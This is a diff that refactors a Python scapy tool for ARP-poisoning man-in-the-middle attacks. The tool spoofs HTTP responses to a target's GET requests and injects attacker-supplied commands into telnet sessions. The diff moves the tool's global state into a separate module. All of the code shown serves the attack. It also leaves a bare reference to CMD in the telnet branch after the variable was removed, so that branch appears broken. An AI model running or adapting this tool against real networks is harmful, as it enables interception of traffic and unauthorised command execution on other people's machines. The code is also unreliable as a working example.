@@ -4,18 +4,7 @@ import time
 from scapy.all import *
 
 import arp_poisoning
-
-MY_MAC = ""
-MY_IP = ""
-IFACE = ""
-
-GATEWAY_MAC = ""
-_SRC_DST = {}
-STOP_SNIFF = ""
-
-PROTO = ""
-CMD = ""
-STOP_SNIFF = False
+import globals
 
 
 def forge_response(p, proto):
@@ -70,26 +59,26 @@ def forge_response(p, proto):
 
 
 def hijack(p):
-    if PROTO == 'http':
+
+    if globals.PROTO == 'http':
         if 'GET' in str(p):
             response = forge_response(p, 'http')
             print('Spoofed Response: ', response.summary())
-            sendp(response, verbose=0, iface=IFACE)
+            sendp(response, verbose=0, iface=globals.IFACE)
 
-    elif PROTO == 'telnet':
+    elif globals.PROTO == 'telnet':
         if CMD not in str(p[TCP].payload):
             cmd = forge_response(p, 'telnet')
             print('Spoofed command: ', cmd[TCP].payload)
 
             print("[+] Executing command...")
-            sendp(cmd, verbose=0, iface=IFACE)
+            sendp(cmd, verbose=0, iface=globals.IFACE)
 
             sys.exit(0)
 
 
 def main():
-    global GATEWAY_MAC, _SRC_DST, MY_MAC, MY_IP, PROTO, CMD, IFACE
-
+    
     parser = argparse.ArgumentParser()
 
     parser.add_argument(
@@ -121,11 +110,11 @@ def main():
 
     args = parser.parse_args()
 
-    MY_MAC = get_if_hwaddr(args.interface)
-    MY_IP = get_if_addr(args.interface)
-    IFACE = args.interface
+    globals.MY_MAC = get_if_hwaddr(args.interface)
+    globals.MY_IP = get_if_addr(args.interface)
+    globals.IFACE = args.interface
 
-    print(f"My MAC: {MY_MAC}\nMy IP: {MY_IP}")
+    print(f"My MAC: {globals.MY_MAC}\nMy IP: {globals.MY_IP}")
     print()
 
     print(f"[+] Determining target and gateway MAC address.")
@@ -145,8 +134,8 @@ def main():
         gatewayMAC = result[0]['MAC']
 
     # Define packet forwarding source and destination
-    GATEWAY_MAC = gatewayMAC
-    _SRC_DST = {
+    globals.GATEWAY_MAC = gatewayMAC
+    globals._SRC_DST = {
         gatewayMAC: targetMAC,
         targetMAC: gatewayMAC,
     }
@@ -154,15 +143,15 @@ def main():
     print(f"[+] Performing ARP poisoning MITM.")
 
     if args.proto == 'http':
-        PROTO = 'http'
+        globals.PROTO = 'http'
         filter = f"ip and tcp port 80 and ether src {targetMAC}"
 
     elif args.proto == 'telnet':
-        PROTO = 'telnet'
-        CMD = args.cmd
+        globals.PROTO = 'telnet'
+        globals.CMD = args.cmd
         filter = f"ip and tcp port 23 and ether src {gatewayMAC}"
 
-    arp_poisoning.arp_mitm(args.target, args.gateway, targetMAC, gatewayMAC, MY_MAC, hijack, filter, args.interface)
+    arp_poisoning.arp_mitm(args.target, args.gateway, targetMAC, gatewayMAC, globals.MY_MAC, hijack, filter, args.interface)
 
 
 if __name__ == '__main__':
